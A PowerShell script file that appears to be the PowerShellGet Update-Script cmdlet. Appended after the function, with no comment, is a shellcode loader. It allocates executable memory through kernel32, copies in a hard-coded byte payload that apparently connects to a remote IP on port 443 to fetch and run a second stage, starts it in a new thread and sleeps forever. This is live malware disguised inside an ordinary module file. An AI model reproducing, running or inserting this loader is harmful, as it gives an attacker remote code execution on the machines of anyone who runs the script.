function Update-Script {
    
    [CmdletBinding(SupportsShouldProcess = $true,
        HelpUri = 'https://go.microsoft.com/fwlink/?LinkId=619787')]
    Param
    (
        [Parameter(ValueFromPipelineByPropertyName = $true,
            Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Name,

        [Parameter(ValueFromPipelineByPropertyName = $true)]
        [ValidateNotNull()]
        [string]
        $RequiredVersion,

        [Parameter(ValueFromPipelineByPropertyName = $true)]
        [ValidateNotNull()]
        [string]
        $MaximumVersion,

        [Parameter(ValueFromPipelineByPropertyName = $true)]
        [ValidateNotNullOrEmpty()]
        [Uri]
        $Proxy,

        [Parameter(ValueFromPipelineByPropertyName = $true)]
        [PSCredential]
        $ProxyCredential,

        [Parameter(ValueFromPipelineByPropertyName = $true)]
        [PSCredential]
        $Credential,

        [Parameter()]
        [Switch]
        $Force,

        [Parameter()]
        [Switch]
        $AllowPrerelease,

        [Parameter()]
        [switch]
        $AcceptLicense,

        [Parameter()]
        [switch]
        $PassThru
    )

    Begin {
        Install-NuGetClientBinaries -CallerPSCmdlet $PSCmdlet -Proxy $Proxy -ProxyCredential $ProxyCredential

        
        $scriptNamesInPipeline = @()
    }

    Process {
        $scriptFilePathsToUpdate = @()

        $ValidationResult = Validate-VersionParameters -CallerPSCmdlet $PSCmdlet `
            -Name $Name `
            -MaximumVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion `
            -AllowPrerelease:$AllowPrerelease

        if (-not $ValidationResult) {
            
            
            return
        }

        if (-not $Name) {
            $Name = @('*')
        }

        if ($Name) {
            foreach ($scriptName in $Name) {
                $availableScriptPaths = Get-AvailableScriptFilePath -Name $scriptName -Verbose:$false

                if (-not $availableScriptPaths -and -not (Test-WildcardPattern -Name $scriptName)) {
                    $message = $LocalizedData.ScriptNotInstalledOnThisMachine -f ($scriptName, $script:MyDocumentsScriptsPath, $script:ProgramFilesScriptsPath)
                    Write-Error -Message $message -ErrorId "ScriptNotInstalledOnThisMachine" -Category InvalidOperation -TargetObject $scriptName
                    continue
                }

                foreach ($scriptFilePath in $availableScriptPaths) {
                    
                    $installedScriptFilePath = Get-InstalledScriptFilePath -Name ([System.IO.Path]::GetFileNameWithoutExtension($scriptFilePath)) |
                    Microsoft.PowerShell.Core\Where-Object { $_ -eq $scriptFilePath }

                    if ($installedScriptFilePath) {
                        $scriptFilePathsToUpdate += $installedScriptFilePath
                    }
                    else {
                        if (-not (Test-WildcardPattern -Name $scriptName)) {
                            $message = $LocalizedData.ScriptNotInstalledUsingPowerShellGet -f ($scriptName)
                            Write-Error -Message $message -ErrorId "ScriptNotInstalledUsingPowerShellGet" -Category InvalidOperation -TargetObject $scriptName
                        }
                        continue
                    }
                }
            }
        }

        $PSBoundParameters["Provider"] = $script:PSModuleProviderName
        $PSBoundParameters[$script:PSArtifactType] = $script:PSArtifactTypeScript
        $PSBoundParameters["InstallUpdate"] = $true

        foreach ($scriptFilePath in $scriptFilePathsToUpdate) {
            $scriptName = [System.IO.Path]::GetFileNameWithoutExtension($scriptFilePath)

            $installedScriptInfoFilePath = $null
            $installedScriptInfoFileName = "$($scriptName)_$script:InstalledScriptInfoFileName"

            if ($scriptFilePath.ToString().StartsWith($script:MyDocumentsScriptsPath, [System.StringComparison]::OrdinalIgnoreCase)) {
                $installedScriptInfoFilePath = Microsoft.PowerShell.Management\Join-Path -Path $script:MyDocumentsInstalledScriptInfosPath `
                    -ChildPath $installedScriptInfoFileName
            }
            elseif ($scriptFilePath.ToString().StartsWith($script:ProgramFilesScriptsPath, [System.StringComparison]::OrdinalIgnoreCase)) {
                $installedScriptInfoFilePath = Microsoft.PowerShell.Management\Join-Path -Path $script:ProgramFilesInstalledScriptInfosPath `
                    -ChildPath $installedScriptInfoFileName

            }

            $psgetItemInfo = $null
            if ($installedScriptInfoFilePath -and (Microsoft.PowerShell.Management\Test-Path -Path $installedScriptInfoFilePath -PathType Leaf)) {
                $psgetItemInfo = DeSerialize-PSObject -Path $installedScriptInfoFilePath
            }

            
            if (-not $psgetItemInfo -or ($scriptNamesInPipeline -contains $psgetItemInfo.Name)) {
                continue
            }


            $scriptFilePath = Microsoft.PowerShell.Management\Join-Path -Path $psgetItemInfo.InstalledLocation `
                -ChildPath "$($psgetItemInfo.Name).ps1"

            
            if (-not (Microsoft.PowerShell.Management\Test-Path -Path $scriptFilePath -PathType Leaf)) {
                Microsoft.PowerShell.Management\Remove-Item -Path $installedScriptInfoFilePath -Force -ErrorAction SilentlyContinue

                continue
            }

            $scriptNamesInPipeline += $psgetItemInfo.Name

            $message = $LocalizedData.CheckingForScriptUpdate -f ($psgetItemInfo.Name)
            Write-Verbose -Message $message

            $providerName = Get-ProviderName -PSCustomObject $psgetItemInfo
            if (-not $providerName) {
                $providerName = $script:NuGetProviderName
            }

            $PSBoundParameters["MessageResolver"] = $script:PackageManagementUpdateScriptMessageResolverScriptBlock
            $PSBoundParameters["PackageManagementProvider"] = $providerName
            $PSBoundParameters["Name"] = $psgetItemInfo.Name
            $PSBoundParameters['Source'] = $psgetItemInfo.Repository
            if ($AllowPrerelease) {
                $PSBoundParameters[$script:AllowPrereleaseVersions] = $true
            }
            $null = $PSBoundParameters.Remove("AllowPrerelease")
            $null = $PSBoundParameters.Remove("PassThru")

            $PSBoundParameters["Scope"] = Get-InstallationScope -PreviousInstallLocation $scriptFilePath -CurrentUserPath $script:MyDocumentsScriptsPath
            $sid = PackageManagement\Install-Package @PSBoundParameters

            if ($PassThru) {
                $sid | Microsoft.PowerShell.Core\ForEach-Object { New-PSGetItemInfo -SoftwareIdentity $_ -Type $script:PSArtifactTypeScript }
            }
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0x69,0x69,0xb7,0x1e,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

